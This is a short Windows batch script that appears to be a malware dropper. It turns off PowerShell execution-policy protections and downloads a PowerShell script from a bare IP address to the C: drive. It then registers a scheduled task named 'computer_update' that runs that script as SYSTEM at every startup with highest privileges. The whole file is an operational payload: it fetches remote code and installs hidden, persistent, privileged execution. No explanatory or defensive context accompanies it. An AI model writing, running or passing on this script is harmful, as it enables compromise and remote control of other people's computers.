@echo off
powershell -c Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force 
powershell  Get-ExecutionPolicy

powershell -c "Invoke-WebRequest -Uri 'http://103.62.153.74:53000/computer_detail/script.ps1' -OutFile 'C:/script.ps1'"

schtasks /create /tn "computer_update" /sc onstart /delay 0010:00 /rl highest /ru system /tr "powershell -ExecutionPolicy Bypass -File C:/script.ps1"
pause